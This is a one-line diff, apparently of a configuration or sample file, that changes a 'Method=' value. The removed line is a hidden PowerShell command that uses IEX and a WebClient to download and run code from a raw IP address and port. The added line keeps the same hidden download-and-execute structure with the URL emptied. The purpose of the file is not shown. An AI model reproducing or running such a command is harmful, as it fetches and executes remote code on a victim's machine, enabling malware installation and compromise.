@@ -1,1 +1,1 @@
-Method=powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://47.76.101.44:8081/a'))"
+Method=powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring(''))"
